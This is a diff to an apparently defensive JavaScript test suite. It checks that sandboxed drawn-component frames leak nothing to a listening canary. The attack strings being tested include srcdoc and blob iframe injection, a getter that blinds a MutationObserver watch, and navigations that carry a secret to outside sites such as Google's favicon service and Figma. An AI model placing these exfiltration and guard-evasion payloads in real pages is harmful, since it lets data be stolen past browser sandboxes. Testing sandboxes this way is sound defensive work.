@@ -113,7 +113,8 @@ const peer = () =>
 const script = (src) => `<script>${src}</` + 'script>';
 const inner = (src) => `'<scr'+'ipt>'+${JSON.stringify(src)}+'</scr'+'ipt>'`;
 
-const ATTACKS = {
+/* A FUNCTION, so each is written with the canary's port, which is not known until `before` has run. */
+const attacks = () => ({
   'a peer connection': peer(),
   'a blob document, with no guard in it': `location=URL.createObjectURL(new Blob([${inner(peer())}],{type:'text/html'}));`,
   'a srcdoc frame': `var f=document.createElement('iframe');f.srcdoc=${inner(peer())};document.body.append(f);`,
@@ -121,7 +122,7 @@ const ATTACKS = {
   'a srcdoc frame, the watch blinded with a getter': `Object.defineProperty(MutationRecord.prototype,'addedNodes',{get:function(){return []}});var f=document.createElement('iframe');f.srcdoc=${inner(peer())};document.body.append(f);`,
   'a provider it navigates itself to': `location='https://www.google.com/s2/favicons?domain='+${JSON.stringify(SECRET)}+'.example.invalid';`,
   'another provider it navigates itself to': `location='https://www.figma.com/?'+${JSON.stringify(SECRET)};`,
-};
+});
 const KINDS = {
   'a drawn component': { frame: '/drawn-frame', doc: (code) => drawnDocument(code, { data, theme }) },
   'a visual': { frame: '/drawn-frame', doc: (code) => visualDocument(code, {}, theme) },
@@ -149,7 +150,7 @@ test('THE CANARY HEARS A PAGE WITH NO GUARD, so a silence below means something'
 for (const [kind, { frame, doc: documentOf }] of Object.entries(KINDS)) {
   test(`${kind} sends nothing out`, async (t) => {
     if (browser === null) return t.skip('no browser to open');
-    for (const [name, code] of Object.entries(ATTACKS)) {
+    for (const [name, code] of Object.entries(attacks())) {
       const heard = await drawnIn(frame, documentOf(script(code)));
       assert.deepEqual(heard, [], `${kind}, by ${name}, reached the canary`);
     }
